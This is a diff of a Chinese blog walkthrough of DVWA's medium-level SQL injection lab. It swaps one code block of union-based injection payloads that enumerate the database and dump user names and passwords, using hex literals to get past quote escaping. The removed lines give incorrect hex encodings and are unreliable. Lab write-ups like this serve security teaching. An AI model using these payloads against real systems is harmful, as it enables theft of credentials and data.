@@ -93,7 +93,7 @@
 <div align="center"><img src="https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/SQL Injection/Middle/5.png" width="200" height="200"></div>
 
 <p>&emsp;&emsp;剩余步骤和级别low相同，一步步找出数据库名、表名、列名，最后获得用户和密码。需要注意的是单引号等特殊字符被转义，因此不能使用，当我们需要使用’dvwa’或者’users’时，可以使用16进制来绕过：</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">1 union select 1,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=276476776127#      276476776127是&#x27;dvwa&#x27;的16进制</span><br><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_name=27757365727327#   27757365727327是&#x27;users&#x27;的16进制</span><br><span class="line">1 union select user,password from users#</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">1 union select 1,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761#      0x64767761是dvwa的16进制</span><br><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#   0x7573657273是users的16进制</span><br><span class="line">1 union select user,password from users#</span><br></pre></td></tr></table></figure>
 <p>&emsp;&emsp;最后结果如下：</p>
 <div align="center"><img src="https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/SQL Injection/Middle/6.png" width="200" height="200"></div>
 <br>
